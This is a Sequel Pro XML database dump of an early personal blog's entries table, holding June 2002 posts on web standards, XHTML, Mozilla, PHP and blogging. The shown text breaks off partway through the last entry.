<?xml version="1.0"?>

<!--
-
- Sequel Pro XML dump
- Version 4096
-
- http://www.sequelpro.com/
- http://code.google.com/p/sequel-pro/
-
- Host: localhost (MySQL 5.6.16)
- Database: simonwillison
- Generation Time Time: 2015-07-12 18:32:18 +0000
-
-->

<mysqldump xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance">
<database name="simonwillison">

	<table_structure name="blog_entry">
		<field field="id" type="int(11)" null="NO" key="PRI" default="&lt;null&gt;" extra="auto_increment" />
		<field field="title" type="varchar(255)" null="NO" key="" default="" extra="" />
		<field field="slug" type="varchar(64)" null="NO" key="MUL" default="" extra="" />
		<field field="body" type="longtext" null="NO" key="" default="&lt;null&gt;" extra="" />
		<field field="created" type="datetime" null="NO" key="MUL" default="0000-00-00 00:00:00" extra="" />
		<field field="comments_open" type="tinyint(1)" null="NO" key="" default="0" extra="" />

		<options name="blog_entry" engine="MyISAM" version="10" row_format="Dynamic" rows="1599" avg_row_length="1398" data_length="2236920" max_data_length="281474976710655" index_length="92160" data_free="0" create_time="2015-07-12 13:28:17" update_time="2015-07-12 13:28:34" collation="utf8_general_ci" create_options="" comment="" />
	</table_structure>

	<table_data name="blog_entry">

	<row>
		<field name="id">1</field>
		<field name="title">WaSP Phase II</field>
		<field name="slug">webStandards</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://www.webstandards.org/&quot;&gt;Web Standards&lt;/a&gt; project has launched Phase II.&lt;/p&gt;</field>
		<field name="created">2002-06-12 01:44:12</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">2</field>
		<field name="title">Blogging aint easy</field>
		<field name="slug">bloggingAintEasy</field>
		<field name="body">&lt;p&gt;Blogging isn't nearly as easy as it looks. After several days hacking around in PHP (I'm far too proud to use an off the shelf solution) I find myself confronted with a blank slate, and writers block has taken hold. The toughest thing is working out what style to use in blog entries - my previous writing for the web has been primarily on forums (where posts do not have to stand on their own) or news sites where a formal, unopinionated tone is required. A blog should be informal but informative, with each post hopefully adding a new angle to the topic in hand. I'm sure it will get easier as I go along...&lt;/p&gt;</field>
		<field name="created">2002-06-12 02:02:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">3</field>
		<field name="title">Todo list</field>
		<field name="slug">todoList</field>
		<field name="body">&lt;h4&gt;Weblog TODO List&lt;/h4&gt;
I've got the bare bones of a weblog up and running now -  essentially the ability to add entries which are categorised and archived in a permanent location. Still to come...
&lt;ol&gt;
&lt;li&gt;An edit function&lt;/li&gt;
&lt;li&gt;A comments system (probably similar to &lt;a href=&quot;http://weblog.delacour.net/&quot;&gt;Jonathan Delacour's&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;RSS feeds for individual categories&lt;/li&gt;
&lt;li&gt;Referral tracking (as seen on &lt;a href=&quot;http://diveintomark.org/&quot;&gt;diveintomark&lt;/a&gt;)&lt;/li&gt;
&lt;li&gt;A better form of overall statistics tracking than that &lt;a href=&quot;http://stats.bath.ac.uk/&quot;&gt;provided by the University&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;A system for storing more permanent feature articles&lt;/li&gt;
&lt;li&gt;An XML-RPC API for posting with an accompanying &lt;a href=&quot;http://www.pythoncard.org/&quot;&gt;PythonCard&lt;/a&gt; application&lt;/li&gt;
&lt;li&gt;An interface for editing my Blog Roll&lt;/li&gt;
&lt;li&gt;Allow visitors to include/exclude categories via cookies&lt;/li&gt;
&lt;li&gt;A preview post feature&lt;/li&gt;
&lt;li&gt;A link directory that accumulates links automatically by parsing blog entries&lt;/li&gt;
&lt;li&gt;Dancing monkeys - definitely dancing monkeys&lt;/li&gt;
&lt;/ol&gt;This blog is written in PHP and uses serialized PHP objects in flat text files for storage. I will put together a full article on how everything works as soon as I've implemented a &quot;permanent feature&quot; archive.</field>
		<field name="created">2002-06-12 02:47:03</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">4</field>
		<field name="title">Netscape 4 is 5 years old</field>
		<field name="slug">t1024344375</field>
		<field name="body">&lt;p&gt;Netscape 4 hit 5 years old yesterday. Scott Andrew celebrated this monumental occasion with a &lt;a href=&quot;http://www.scottandrew.com/ns4.html&quot;&gt;poetic tombstone tribute&lt;/a&gt;, entitled &quot;1997 - 2002&quot;. The challenge now is to make this dream a reality - NS4 still has a stronghold in many corporate and institutional IT departments, as Zeldman bemoans in the first &quot;&lt;a href=&quot;http://www.webstandards.org/opinion/&quot;&gt;opinion&lt;/a&gt;&quot; of the new Web Standards project. An opinion that is notable in its absence of a permalink ;)&lt;/p&gt;</field>
		<field name="created">2002-06-12 02:59:49</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">5</field>
		<field name="title">Webdesign-L ablaze!</field>
		<field name="slug">t1024344376</field>
		<field name="body">&lt;p&gt;The &lt;a href=&quot;http://www.webdesign-l.com/&quot; title=&quot;A mailing list for web professionals&quot;&gt;Webdesign-L&lt;/a&gt; mailing list is ablaze with a huge, rambling, flamey thread about the relaunched &lt;a href=&quot;http://www.webstandards.org/&quot; title=&quot;WaSP&quot;&gt;Web Standards&lt;/a&gt; project. As with so many flames it has become quite difficut to work out what is being argued over and why (an issue compounded by the emergence of sub threads on everything from US law to how to upset a Canadian). I would provide links, but the list does not maintain a web accessible archive.&lt;/p&gt;

&lt;p&gt;Steven Champeon of WaSP has been using the thread to set a few things straight. A major point of confusion that has been resolved is that web standards does NOT mean CSS layouts. To quote Steven:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;What I'm wondering is this: when did the WaSP ever say anything about
tableless sites? I've been part of the group since the beginning, and
I don't *ever* recall us making any noise about tables. Some /members/
of the group, myself included, have certainly done so, because it's a
Good Idea, but it's never been part of the WaSP's mission.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;One useful resource that did come out of the discussion was a link to Matthew Haughey's excellent &lt;a href=&quot;http://www.digital-web.com/tutorials/tutorial_1999-12.shtml&quot; title=&quot;How to Write Effective Mailing List Email&quot;&gt;tutorial&lt;/a&gt; on writing effective mailing list emails, which pays particular attention to the best way of quoting other posts.&lt;/p&gt;

&lt;p&gt;I've been running my own campaign for web standards over on the &lt;a href=&quot;http://www.wmhub.net/forums/showthread.php?s=&amp;amp;threadid=1797&quot;&gt;WPWM forums&lt;/a&gt; with relatively unimpressive results. 
This advocacy thing is harder than it looks.&lt;/p&gt;</field>
		<field name="created">2002-06-12 14:29:41</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">6</field>
		<field name="title">Day 3: Bill</field>
		<field name="slug">day3Bill</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://diveintomark.org/archives/2002/06/12.html&quot;&gt;Day 3: Bill&lt;/a&gt; - Mark Pilgrim's &quot;30 days to a more accessible weblog&quot; series continues with the story of Bill, a retired military officer with a physical disability who surfs the web on an old Linux laptop and runs a mailing list on Veteran's rights. The piece also clarifies that the characters profiled are fictional (call me naive but I wasn't sure if they were based on real people or not). I can't wait to see where Mark is going with this - 3 days in and he has already built up some beautifully observed case studies and it will be fascinating to see what he does with them. I'm also intrigued as to how he can make his blog any &lt;em&gt;more&lt;/em&gt; accessible - his current &lt;a href=&quot;http://diveintomark.org/archives/rooms/accessibility_statement/&quot;&gt;accessibility statement&lt;/a&gt; demonstrates a far higher level of understanding than any other site I've yet seen on the web.&lt;/p&gt;</field>
		<field name="created">2002-06-12 15:17:24</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">7</field>
		<field name="title">Charity and Amazon</field>
		<field name="slug">charityAndAmazon</field>
		<field name="body">&lt;p&gt;Spotted over at FuzzyBlog: &lt;a href=&quot;http://radio.weblogs.com/0103807/stories/2002/06/08/ifIWasJeffBezosOfAmazonAndIWantedToDoTheRightThingHeresWhatIdDo.html&quot;&gt;If I Was Jeff Bezos of Amazon and I wanted to do the Right Thing, Here's What I'd Do&lt;/a&gt;. In a nutshell, Scott Johnson suggests  that Amazon set up a free (or very low cost) system for charities to gather donations through Amazon's payment system - a charitable version of PayPal. Why Amazon? They have a good reputation, a well implemented payment system  and a massive user base. The more convenient the system the more likely people are to donate.&lt;/p&gt;

&lt;p&gt;I think this is an excellent idea, but then like Scott Johnson I like the idea of doing the right thing. I've mailed my note of support to &lt;a href=&quot;mailto:amazon@fuzzygroup.com&quot;&gt;amazon@fuzzygroup.com&lt;/a&gt;. If this takes off in a big way it could really demonstrate the power of the humble blog.&lt;/p&gt;</field>
		<field name="created">2002-06-13 03:21:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">8</field>
		<field name="title">Tree from unordered list</field>
		<field name="slug">treeFromUnorderedList</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.kryogenix.org/code/browser/aqtree/aqtree.html&quot; title=&quot;Tree structures from unordered lists&quot;&gt;The amazing tree generator&lt;/a&gt; (via &lt;a href=&quot;http://www.web-graphics.com/mtarchive/000517.php#000517&quot;&gt;webgraphics&lt;/a&gt;, who in turn got it from &lt;a href=&quot;http://two.pairlist.net/mailman/listinfo/css-discuss&quot;&gt;CSS Discuss&lt;/a&gt;). This is just the kind of DHTML I really like. Place a simple nested unordered list in your document and this external javascript can use the DOM to convert the list in to a hierarchical outline style tree, with each node expandable to show the child members. It looks great and works in both IE and Mozilla - I haven't tested it in other browsers but it should degrade gracefully, leaving them with a static nested list.&lt;/p&gt;</field>
		<field name="created">2002-06-13 03:30:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">9</field>
		<field name="title">Mozilla alpha</field>
		<field name="slug">mozillaAlpha</field>
		<field name="body">&lt;p&gt;Mozilla 1.1 Alpha was released yesterday, and after reading Scott Andrew's &lt;a href=&quot;http://www.scottandrew.com/weblog/000382&quot;&gt;recommendation&lt;/a&gt; (especially with respect to the mail client) I decided to give it a go. I found the ability to turn off images in mail eventually - it's hidden away in Edit-&amp;gt;Preferences-&amp;gt;Privacy &amp;amp; Security-&amp;gt;Images as opposed to Mail &amp;amp; News preferences where I looked for it first.&lt;/p&gt;

&lt;p&gt;The features that made it worthwhile for me was the welcome return of the site navigation bar. Mozilla can once again take advantage of &amp;lt;link&amp;gt; tags in HTML documents, adding an additional toolbar with previous/next buttons and other useful options. The feature was &lt;a href=&quot;http://bugzilla.mozilla.org/show_bug.cgi?id=138496&quot; title=&quot;Back out linktoolbar (site nav bar) from 1.0 branch :(&quot;&gt;pulled&lt;/a&gt; from Mozilla 1.0 for performance reasons, but it's back in 1.1 and useful as ever. I was pleased to see that it picks up on Mark Pilgrim's &lt;a href=&quot;http://diveintomark.org/archives/2002/06/02.html#important_change_to_the_link_tag&quot;&gt;RSS alternative version&lt;/a&gt; link, listing the RSS version under &quot;Other Versions&quot;. Useful information about getting your site to take advantage of this feature can be found &lt;a href=&quot;http://lists.w3.org/Archives/Public/www-html/2001Oct/0026.html&quot;&gt;here&lt;/a&gt; - looks like I've got some work to do...&lt;/p&gt;

&lt;img alt=&quot;The toolbar provides a set of navigation controls for moving through a site, plus additional buttons giving access to other related information&quot; height=&quot;24&quot; src=&quot;http://simon.incutio.com/~cs1spw/blog/images/mozilla-1.1-site-navigation.gif&quot; title=&quot;The Mozilla Site Navigation bar&quot; width=&quot;437&quot; /&gt;</field>
		<field name="created">2002-06-13 09:53:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">10</field>
		<field name="title">Hixie on WaSP</field>
		<field name="slug">hixieOnWaSP</field>
		<field name="body">&lt;p&gt;Hixie has been poking around the new &lt;a href=&quot;http://www.webstandards.org/&quot;&gt;Web Standards Project site&lt;/a&gt;, and &lt;a href=&quot;http://ln.hixie.ch/?start=1023878214&amp;amp;count=1&quot; title=&quot;Buzz: Shooting the messenger&quot;&gt;he is not impressed&lt;/a&gt;. His analysis of the site makes interesting reading, with complaints including CSS colour and background not being set at the same time and the content-type of the document being set as &quot;text/html&quot; rather than the more correct &quot;text/xml&quot; required for XHTML documents.&lt;/p&gt;

&lt;p&gt;Some of his points seem overly picky, in particular the content-type issue. I checked a site Hixie mentions as sending the correct text/xml content-type header in NS4 and, as I suspected, NS4 popped up a &quot;download&quot; box and failed to render the page. I also checked out the W3's &lt;a href=&quot;http://www.w3.org/MarkUp/&quot;&gt;XHTML home page&lt;/a&gt;  - XHTML1.0 strict and a content-type header of text/html. His other points seem worth thinking about, but I would not consider any of them to significantly dilute WaSP's message.&lt;/p&gt;

&lt;p&gt;So respect to Hixie for taking on the mantle of the ultimate standards advocate, but you can take a good thing too far.&lt;/p&gt;</field>
		<field name="created">2002-06-13 15:36:22</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">11</field>
		<field name="title">Hixie replies</field>
		<field name="slug">hixieReplies</field>
		<field name="body">&lt;p&gt;Hixie has &lt;a href=&quot;http://ln.hixie.ch/?start=1023984510&amp;amp;count=1&quot; title=&quot;Buzz: One shot stuns, two shots kill&quot;&gt;replied&lt;/a&gt; to my previous post (and provided my first ever link in the process).&lt;/p&gt;

&lt;blockquote cite=&quot;http://ln.hixie.ch/?start=1023984510&amp;amp;count=1&quot;&gt;&lt;p&gt;The message may not be diluted... I simply think it is very bad form for a group that is claiming to champion the standards to be making any mistakes at all on their site.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I can't disagree there (and I hope they correct some of the problems with the site). As for the content-type header issue, Hixie's stance is that &lt;q cite=&quot;http://ln.hixie.ch/?start=1023984510&amp;amp;count=1&quot;&gt;using XHTML at this time is inappropriate&lt;/q&gt; due to a lack of proper browser support. He's probably right on that as well, but that leaves us with the question &quot;When CAN we start using XHTML?&quot;. The browser upgrade cycle for an average net user is horrific, hence the continuing relevance of the five year old Netscape 4. It could be another five years before browsers that support XHTML properly are dominant enough for  it to be worth while.&lt;/p&gt;

&lt;p&gt;If by serving content with a text/html header I can create pages in future-proof, easily parsable XHTML and have them accessible to virtually every browser ever release, XHTML it shall be. Then when browser support catches up I'll be ready, and so will my websites.&lt;/p&gt;</field>
		<field name="created">2002-06-13 19:13:56</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">12</field>
		<field name="title">More FuzzyBlog stuff</field>
		<field name="slug">moreFuzzyBlog</field>
		<field name="body">&lt;p&gt;More &lt;a href=&quot;http://radio.weblogs.com/0103807/2002/06/13.html&quot;&gt;FuzzyBlog&lt;/a&gt; stuff. Scott runs one of my favourite blogs - constantly updated, plenty of interesting new content and most of it fits the areas I am interested in. Today's items that caught my eye are &lt;a href=&quot;http://radio.weblogs.com/0103807/stories/2002/06/13/marketing101BloggingAndMarketingOrWhyDoIBlogSoMuch.html&quot;&gt;Why Do I Blog So Much?&lt;/a&gt; and &lt;a href=&quot;http://radio.weblogs.com/0103807/stories/2002/06/08/veryVeryPracticalTipsForTheBusyPersonPart2.html&quot;&gt;Very, Very Practical Tips for the Busy Person : Part 2&lt;/a&gt; (actually posted on Monday, find &lt;a href=&quot;http://radio.weblogs.com/0103807/stories/2002/06/07/veryVeryPracticalTipsForTheBusyPerson.html&quot; title=&quot;Very, Very Practical Tips for the Busy Person&quot;&gt;Part 1 here&lt;/a&gt;.). I particularly liked the following quote from &quot;Why Do I Blog So Much?&quot;:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;Blogging is a superb knowledge capture tool [...]  I use my blog to capture my marketing ideas because if we are to grow, others need to know this.  The interaction I get from sharing them with the world only improves them.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;I'm not too interested in marketing but the idea of sharing knowledge to improve ideas is the principle reason I started this blog.&lt;/p&gt;</field>
		<field name="created">2002-06-13 19:38:39</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">13</field>
		<field name="title">Hixie replies again</field>
		<field name="slug">hixieRepliesAgain</field>
		<field name="body">&lt;p&gt;Hixie has &lt;a href=&quot;http://ln.hixie.ch/?start=1024005568&amp;amp;count=1&quot; title=&quot;Buzz: Third shot disintegrates&quot;&gt;answered&lt;/a&gt; my &lt;a href=&quot;http://www.bath.ac.uk/~cs1spw/blog/archive/2002/06/13/#hixieReplies&quot;&gt;question&lt;/a&gt;. Judging by how long it took IE to support CSS1, he estimates 6 years until XHTML is ready for main stream use. He's almost certainly right, but I'm going to try to stick with XHTML any way (bandwagon jumping can be fun). He also points out that this site does not &lt;a href=&quot;http://validator.w3.org/check/referer&quot;&gt;validate&lt;/a&gt; - I checked the original template but it seems that several of the entries I have added have inadvertantly invalidated the page, mainly through unescaped ampersands and the like. Time to add an automatic &quot;validation&quot; system to my administrative tools - it's a shame the W3 validator isn't available as a web service.&lt;/p&gt;

&lt;p&gt;Thanks for the educational exchange Hixie :)&lt;/p&gt;</field>
		<field name="created">2002-06-14 02:58:09</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">14</field>
		<field name="title">I validate again</field>
		<field name="slug">iValidateAgain</field>
		<field name="body">&lt;p&gt;I &lt;a href=&quot;http://validator.w3.org/check/referer&quot;&gt;validate&lt;/a&gt; again.&lt;/p&gt;</field>
		<field name="created">2002-06-14 03:13:44</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">15</field>
		<field name="title">Zend Engine 2 alpha</field>
		<field name="slug">zendEngine2Alpha</field>
		<field name="body">&lt;p&gt;I don't know how I missed this, but the &lt;a href=&quot;http://www.php.net/&quot;&gt;PHP group &lt;/a&gt;have released an alpha version of PHP with the Zend Engine 2 (&lt;a href=&quot;http://www.php.net/distributions/php-4.3.0-dev-zend2-alpha1pl1.tar.gz&quot;&gt;tarball&lt;/a&gt; / &lt;a href=&quot;http://www.php.net/do_download.php?download_file=php-4.3.0-dev-zend2-win32-alpha1.zip&quot;&gt;Windows binary&lt;/a&gt;). This is exciting stuff - the new scripting engine has vastly improved object support and brand new exception handling, something I've wanted in PHP for a long time. The &lt;a href=&quot;http://www.php.net/ZEND_CHANGES.txt&quot;&gt;CHANGELOG&lt;/a&gt; lists the new features and provides sample code. Here's a summary:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;New Object Model - objects are dealt with by reference and no longer copied every time they are assigned or passed to a method.&lt;/li&gt;
&lt;li&gt;Private Members - classes can have private members, specified with the new &lt;code&gt;private&lt;/code&gt; keyword.&lt;/li&gt;
&lt;li&gt;Object Cloning - via a new &lt;code&gt;__clone()&lt;/code&gt; method.&lt;/li&gt;
&lt;li&gt;Forced deletion of objects - via the new &lt;code&gt;delete&lt;/code&gt; statement.&lt;/li&gt;
&lt;li&gt;Nested classes (namespaces)&lt;/li&gt;
&lt;li&gt;Unified Constructors - constriuctors can now be declared as &lt;code&gt;__construct()&lt;/code&gt; rather than using the name of the class.&lt;/li&gt;
&lt;li&gt;Destructors - specified with &lt;code&gt;__destruct()&lt;/code&gt;.&lt;/li&gt;
&lt;li&gt;Exceptions - including &lt;code&gt;try&lt;/code&gt;, &lt;code&gt;throw&lt;/code&gt; and &lt;code&gt;catch&lt;/code&gt; blocks.&lt;/li&gt;
&lt;li&gt;Dereferencing objects returned from functions - now you can use code like this: &lt;code&gt;('bar')-&amp;gt;method();&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;Static member variables of static classes can now be initialized.&lt;/li&gt;
&lt;li&gt;Parameters that are passed by reference to a function may now have default values.&lt;/li&gt;
&lt;li&gt;Built-In Backtracing - the &lt;code&gt;debug_backtrace()&lt;/code&gt; returns an array of previously called functions, along with their file and line number.&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;It's all good, but it comes with a hefty warning against using the alpha on even semi-production web sites. Personally I can't wait for a deployable version.&lt;/p&gt;</field>
		<field name="created">2002-06-14 03:52:53</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">16</field>
		<field name="title">Sex tips for Geeks</field>
		<field name="slug">sexTips</field>
		<field name="body">&lt;p&gt;Eric Raymond: &lt;a href=&quot;http://www.tuxedo.org/~esr/writings/sextips/&quot;&gt;Sex Tips for Geeks&lt;/a&gt; :)&lt;/p&gt;</field>
		<field name="created">2002-06-14 03:55:32</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">17</field>
		<field name="title">Day 4: Lillian</field>
		<field name="slug">day4Lillian</field>
		<field name="body">&lt;p&gt;Mark Pilgrim's set of case studies is &lt;a href=&quot;http://diveintomark.org/archives/2002/06/13.html#day_4_lillian&quot; title=&quot;Day 4: Lillian&quot;&gt;beginning to shape together&lt;/a&gt;. I've been following responses to it through his &quot;Further reading on today's posts&quot; referral tracking tool - reception has been overwhelmingly positive, with almost &lt;a href=&quot;http://poorbuthappy.com/ease/000188.html&quot; title=&quot;EASE&quot;&gt;universal&lt;/a&gt; &lt;a href=&quot;http://www.thereisnocat.com/showme101.html&quot; title=&quot;There Is No Cat: Pilgrim&amp;apos;s Progress&quot;&gt;praise&lt;/a&gt; for Mark's decision to use the case study format to drive home his point. kcalder &lt;a href=&quot;http://www.kcalder.com/archive.php?when=200206&quot;&gt;criticised&lt;/a&gt;  Mark's suggestion that colour blind users &lt;q&gt;wouldn't get much out of&lt;/q&gt; images on the web, and Mark has apologised and altered the &lt;a href=&quot;http://diveintomark.org/archives/2002/06/11.html&quot; title=&quot;Day 2: Michael&quot;&gt;case study&lt;/a&gt; accordingly. SubAverage called Mark &quot;preachy&quot; and posted a &lt;a href=&quot;http://subaverage.com/archive/2002-06-11#link279&quot;&gt;parody&lt;/a&gt; (mentioned in passing by &lt;a href=&quot;http://scriptingnews.userland.com/backissues/2002/06/13#When:7:36:51AM&quot;&gt;Dave Winer&lt;/a&gt;). All this and we're only on day 4.&lt;/p&gt;</field>
		<field name="created">2002-06-14 04:10:34</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">18</field>
		<field name="title">Blog added to the OED</field>
		<field name="slug">blogAddedToOED</field>
		<field name="body">&lt;p&gt;Dane Carlson: &lt;a href=&quot;http://carlsoncarlson.com/dane/2002/06/13.html#a1115&quot;&gt;Blog to be added to the Oxford English Dictionary&lt;/a&gt;.&lt;/p&gt;</field>
		<field name="created">2002-06-14 04:16:07</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">19</field>
		<field name="title">Meta weblog API</field>
		<field name="slug">metaWeblogAPI</field>
		<field name="body">&lt;p&gt;I'm itching to get an XML-RPC interface to this blog up and running so I can start playing with blogging tools (or roll my own in &lt;a href=&quot;http://www.pythoncard.org/&quot;&gt;PythonCard&lt;/a&gt;).  It looks like Dave Winer's &lt;a href=&quot;http://www.xmlrpc.com/metaWeblogApi&quot;&gt;MetaWeblog API&lt;/a&gt; is just what I need. It describes an XML-RPC interface with 3 methods: &lt;code&gt;metaWeblog.newPost&lt;/code&gt;, &lt;code&gt;metaWeblog.editPost&lt;/code&gt; and &lt;code&gt;metaWeblog.getPost&lt;/code&gt;. More importantly, the standard supports complete flexibility in the data that is sent along with the request. My entries consist of a body, an optional permalink (one is generated if none is specified), optional categories and an optional search string for a &quot;Google It!&quot; link if one is required. The MetaWeblog API looks ideally suited to handling this, and is fully extensible should I change the format of my entries in the future.&lt;/p&gt;</field>
		<field name="created">2002-06-14 07:02:13</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">20</field>
		<field name="title">Mark explains all</field>
		<field name="slug">markExplainsAll</field>
		<field name="body">&lt;p&gt;Over at &lt;a href=&quot;http://diveintomark.org/archives/2002/06/14.html&quot;&gt;diveintomark&lt;/a&gt; Mark Pilgrim has explained the aims of his Accessibility series:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;This series is entitled &quot;30 days to a more accessible weblog&quot;, and it will answer two questions. The first question is &quot;Why should I make my weblog more accessible?&quot; If you do not have a weblog, this series is not for you. The second question is &quot;How can I make my weblog more accessible?&quot; If you are not convinced by the first answer, you will not be interested in the second.&lt;/p&gt;&lt;/blockquote&gt;

&lt;p&gt;He is planning a five week series of tips for creating an accessible weblog, with a new tip each day. The tips will be explained in such a way that even bloggers with no experience of HTML will be able to understand and implement them.&lt;/p&gt;

&lt;p&gt;While I applaud his aims and greatly look forward to the series, I can't help but feel that limiting the series to just bloggers is an unnecessary move. I expect most of the tips to be applicable to a wide array of sites and the web is crying out for a good resource for improving general site accessibility. I'm sure Mark's series will be fantastic, but I would love to see it aimed at a larger target audience.&lt;/p&gt;</field>
		<field name="created">2002-06-14 17:56:08</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">21</field>
		<field name="title">CSS panic guide</field>
		<field name="slug">cssPanicGuide</field>
		<field name="body">&lt;p&gt;Owen Briggs: &lt;a href=&quot;http://thenoodleincident.com/tutorials/css/&quot; title=&quot;/CSS/ - a guide for the unglued&quot;&gt;CSS Panic Guide&lt;/a&gt;. Owen is the author of several excellent CSS resources (including &lt;a href=&quot;http://www.thenoodleincident.com/tutorials/box_lesson/index.html&quot;&gt;Box Lessons&lt;/a&gt; and &lt;a href=&quot;http://www.thenoodleincident.com/tutorials/box_lesson/font/index.html&quot; title=&quot;text sizing - up the garden path&quot;&gt;264 font size screenshots&lt;/a&gt;) and this is his collection of links to CSS resources from all around the web. It covers every CSS reference worth knowing about and is an essential bookmark for anyone interested in using CSS for layouts.&lt;/p&gt;</field>
		<field name="created">2002-06-15 01:40:51</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">22</field>
		<field name="title">Uni year ends</field>
		<field name="slug">uniYearEnds</field>
		<field name="body">&lt;p&gt;Well, I've reached the end of my first year at Bath University (studying a degree in Computer Science) and I can safely say I've never had 9 months go so fast. I've had a fantastic time - I met the girl of my dreams, made a whole bunch of great friends, did loads of cool things and spent far too much money. Today I move out of halls (a terrifying prospect when you live on the ninth floor and the lift is playing up). As an aside, I also lose my lovely fast net connection and return to the trauma of 56K. Thank goodness for &lt;a href=&quot;http://www.mozilla.org/&quot;&gt;Mozilla&lt;/a&gt; and tab based browsing.&lt;/p&gt;

&lt;p&gt;So, if anyone reads this who I know from Uni and haven't personally had a chance to say goodbye to: Have a fantastic summer and I'll see you in September, if not before.&lt;/p&gt;</field>
		<field name="created">2002-06-15 10:00:30</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">23</field>
		<field name="title">Google already</field>
		<field name="slug">googleAlready</field>
		<field name="body">&lt;p&gt;This site has been here for less than four days yet it already shows up as the top result if you search for &lt;a href=&quot;http://www.google.com/search?q=simon+willison&quot;&gt;simon willison&lt;/a&gt; on Google - and I never even submitted the URL. In fact, asking Google to list &lt;a href=&quot;http://www.google.com/search?q=link:www.bath.ac.uk/~cs1spw/blog/&quot;&gt;pages that link&lt;/a&gt; to me currently turns up zero results. Spooky.&lt;/p&gt;</field>
		<field name="created">2002-06-15 10:44:06</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">24</field>
		<field name="title">Meg on blogging</field>
		<field name="slug">megOnBlogging</field>
		<field name="body">&lt;p&gt;Meg Hourihan: &lt;a href=&quot;http://www.oreillynet.com/pub/a/javascript/2002/06/13/megnut.html&quot;&gt;What We're Doing When We Blog&lt;/a&gt;. It's a curious fact of blogdom that many bloggers blog blogging - why they do it, what it is and why it's so important. I feel Meg has nailed it with this article - blogging is defined by the format, not by the subject matter. She also makes some insightful comments about why the blogging format works so well:&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;Freed from the constraints of the printed page (or any concept of &quot;page&quot;), an author can now blog a short thought that previously would have gone unwritten. The weblog's post unit liberates the writer from word count.&lt;/p&gt;&lt;/blockquote&gt;</field>
		<field name="created">2002-06-15 11:01:47</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">25</field>
		<field name="title">Python iterators</field>
		<field name="slug">pythonIterators</field>
		<field name="body">&lt;p&gt;Via &lt;a href=&quot;http://www.pythonware.com/daily/&quot;&gt;Daily Python-URL&lt;/a&gt; (which appears not to provide permalinks): &lt;a href=&quot;http://www.informit.com/content/images/art_deitel_pythoniterators/elementLinks/pythonhtp1_appO_article.pdf&quot; title=&quot;PDF File&quot;&gt;Introduction to Python iterators&lt;/a&gt;. This is an extract from Deitel &amp;amp; Deitel's &quot;Python How To Program&quot; and includes extensive code samples. Iterators are very cool - as I see it, they allow you to overload an object ready for use with Python's powerful &lt;code&gt;for ... in ...&lt;/code&gt; syntax (as well as other looping methods). This blog is implemented as an object in PHP - had I used Python I could display the whole blog using &lt;code&gt;for entry in blog: print entry&lt;/code&gt;.&lt;/p&gt;</field>
		<field name="created">2002-06-15 11:36:58</field>
		<field name="comments_open">0</field>
	</row>

	<row>
		<field name="id">26</field>
		<field name="title">Learning from smart tags</field>
		<field name="slug">learningFromSmartTags</field>
		<field name="body">&lt;p&gt;&lt;a href=&quot;http://www.scottandrew.com/&quot;&gt;Scott Andrew LePera&lt;/a&gt; in a mail to &lt;a href=&quot;http://www.webdesign-l.com/&quot;&gt;Webdesign-L&lt;/a&gt; (sent on the 12th of June, I'm catching up on my mailing list folders):&lt;/p&gt;

&lt;blockquote&gt;&lt;p&gt;What I learned from the smart tags issue:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;A company that owns over 90% of the market can pull the rug out from all of us, whenever it wants.&lt;/li&gt;
&lt;li&gt;The cry of a million developers *can* make a difference.&lt;/li&gt;
&lt;li&gt;The integrity of content is far more important than any other consideration in Web design.  Go ahead, allow users to change font size, impose their own stylesheets, turn off JavaScript and images.&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;But touch my words, use them as jumping points for third-party sponsorships?  There'd better be a check in the mail for me.&lt;/p&gt;&lt;/blockquote&gt;

